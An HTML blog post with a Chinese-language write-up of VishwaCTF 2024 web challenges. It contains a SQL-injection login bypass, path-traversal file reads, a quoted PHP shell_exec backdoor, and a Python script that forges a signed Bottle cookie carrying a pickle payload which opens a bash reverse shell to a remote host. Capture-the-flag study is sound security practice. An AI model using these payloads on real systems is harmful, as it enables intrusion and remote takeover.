@@ -1,0 +1,314 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[vishwactf2024]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[vishwactf2024]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Save The City
+CVE-2018-10993，参考：https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+执行命令读/location.txt文件
+
+fl..." />
+    <meta name="keywords" content="bottle,Pickle,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [vishwactf2024]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-03
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/ateNjvl40/" class="post-tag">
+                  # bottle
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/GFaUKRKUb/" class="post-tag">
+                  # Pickle
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/vishwactf2024web-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="save-the-city">Save The City</h1>
+<p>CVE-2018-10993，参考：<a href="https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d">https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d</a></p>
+<p>执行命令读/location.txt文件<br>
+<img src="https://skyblu3519.github.io/post-images/1709484866433.png" alt="" loading="lazy"></p>
+<p>flag:VishwaCTF{elrow-club-pune}</p>
+<h1 id="recipe-archival-workshop">Recipe Archival Workshop</h1>
+<p>太蠢了这题。</p>
+<p>上传文件后缀改为tiff得到flag<br>
+<img src="https://skyblu3519.github.io/post-images/1709484875674.png" alt="" loading="lazy"></p>
+<p>扫描目录有个cron.sh，里面执行了<code>find uploads/ -type f -cmin +5 -exec rm {} \;</code>。但确实没有任何利用的可能。<br>
+<img src="https://skyblu3519.github.io/post-images/1709484893671.png" alt="" loading="lazy"></p>
+<h1 id="trip-to-us">trip to us</h1>
+<p>dirsearch，发现db<br>
+<img src="https://skyblu3519.github.io/post-images/1709484901388.png" alt="" loading="lazy"></p>
+<p>里面有admin的密码(admin/unbre@k@BLE_24)<br>
+<img src="https://skyblu3519.github.io/post-images/1709484930323.png" alt="" loading="lazy"></p>
+<p>进入/auth-iit-user.php登录admin<br>
+<img src="https://skyblu3519.github.io/post-images/1709484937339.png" alt="" loading="lazy"></p>
+<h1 id="they-are-coming">They Are Coming</h1>
+<p>robots.txt得到Decryption key: th1s_1s_n0t_t5e_f1a9。L3NlY3JldC1sb2NhdGlvbg== 可以base64 -&gt; /secret-location，去/secret-location可以找到local storage有東西<br>
+<img src="https://skyblu3519.github.io/post-images/1709484960638.png" alt="" loading="lazy"></p>
+<p>页面提示加密方式为AES-CBC-128，在线工具解<br>
+<img src="https://skyblu3519.github.io/post-images/1709484967926.png" alt="" loading="lazy"></p>
+<h1 id="medicare-pharma">MediCare Pharma</h1>
+<p>过滤了数字，<code>username=asd&amp;password=asd' or 'a'='a'#</code>得到密码(medicare/5trongp455!)<br>
+<img src="https://skyblu3519.github.io/post-images/1709484974488.png" alt="" loading="lazy"></p>
+<p>进入系统，勾选全部商品点击Buy All可以下载源码<br>
+<img src="https://skyblu3519.github.io/post-images/1709485081075.png" alt="" loading="lazy"></p>
+<p>PS.在js里面也可以找到源码（images/pharmacy.txt）<br>
+<img src="https://skyblu3519.github.io/post-images/1709485086332.png" alt="" loading="lazy"></p>
+<pre><code class="language-php">&lt;?php
+header('Content-Type: application/json');
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) 
+{
+    $enteredInput = $_POST['search_param'];
+    
+    if (strlen($enteredInput) == 0)
+    {
+        echo json_encode(['result' =&gt; &quot;Search bar cannot be empty&quot;]);
+    }
+
+    else
+    {
+        $result = shell_exec($enteredInput);
+
+        if ($result == null)
+        {
+            echo json_encode(['result' =&gt; ($enteredInput . &quot; not found in store&quot;)]);
+        }
+
+        else
+        {
+            echo json_encode(['result' =&gt; $result]);
+        }
+    }
+
+} 
+
+else 
+{
+    http_response_code(404);
+    echo json_encode(['error' =&gt; 'Access Forbidden']);
+}
+?&gt;
+</code></pre>
+<p>search_param参数是一个后门，执行命令找flag<br>
+<img src="https://skyblu3519.github.io/post-images/1709485106113.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1709485114732.png" alt="" loading="lazy"></p>
+<h1 id="prompt-injection">prompt injection</h1>
+<p>原题：<a href="https://squ1rrel.dev/sekai-bottle">https://squ1rrel.dev/sekai-bottle</a></p>
+<ul>
+<li>/show?id=../../proc/self/cmdline任意文件读取进程启动命令</li>
+<li>/show?id=../../../app/app.py读取源码</li>
+<li>/show?id=../../app/config/secret.py读取密钥Vishwa</li>
+<li>bottle request.get_cookie RCE，编写利用脚本</li>
+<li>用脚本计算的payload替换cookie中name的value</li>
+<li>反弹shell，执行/flag，getflag</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/1709485146725.png" alt="" loading="lazy"><br>
+计算payload脚本：</p>
+<pre><code class="language-python">import hashlib
+import os
+import pickle
+import base64
+import hmac
+
+Vishwa = &quot;trrrrrrrrrrrrryyyyyyyyyyyharddddddddd&quot;
+remote_ip = &quot;remote_ip&quot;
+def tob(s, enc='utf8'):
+    return s.encode(enc) if isinstance(s, str) else bytes(s)
+class A(object):
+    def __reduce__(self):
+        s = f&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/{remote_ip}/9999 0&gt;&amp;1\&quot;&quot;
+        return (os.system, (s,))
+
+a = A()
+s = pickle.dumps(a)
+msg = base64.b64encode(s)
+sig = base64.b64encode(hmac.new(tob(Vishwa), msg, digestmod=hashlib.md5).digest())
+
+payload = tob('!') + sig + tob('?') + msg
+print(payload)
+</code></pre>
+<p>下面简单看下<code>get_cookie</code>中反序列化漏洞产生的原因。从cookie中获取的值直接传入<code>cookie_decode</code><br>
+<img src="https://skyblu3519.github.io/post-images/1709485196140.png" alt="" loading="lazy"></p>
+<p>这里就有熟悉的<code>pickle.loads</code><br>
+<img src="https://skyblu3519.github.io/post-images/1709485201955.png" alt="" loading="lazy"></p>
+<p>bottle中cookie的格式为:</p>
+<pre><code class="language-python">![sig]?[msg]
+</code></pre>
+<p><code>_lscmp</code>是一个bottle实现的字符串安全比较的函数，验证的方式为</p>
+<pre><code class="language-python">_lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest()))
+</code></pre>
+<p>通过之后pickle.loads便会对msg反序列化。</p>
+<h1 id="h34d3rs">H34D3RS</h1>
+<p>http 请求头伪造</p>
+<pre><code>User-Agent: lorbrowser
+Referer: https://vishwactf.com/
+Date: 2024
+Upgrade-Insecure-Requests: 10
+Downlink: 999999999
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#save-the-city">Save The City</a></li>
+<li><a href="#recipe-archival-workshop">Recipe Archival Workshop</a></li>
+<li><a href="#trip-to-us">trip to us</a></li>
+<li><a href="#they-are-coming">They Are Coming</a></li>
+<li><a href="#medicare-pharma">MediCare Pharma</a></li>
+<li><a href="#prompt-injection">prompt injection</a></li>
+<li><a href="#h34d3rs">H34D3RS</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/qing-shao-nian-ctfweb-wp/">
+              <h3 class="post-title">
+                [青少年CTF]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
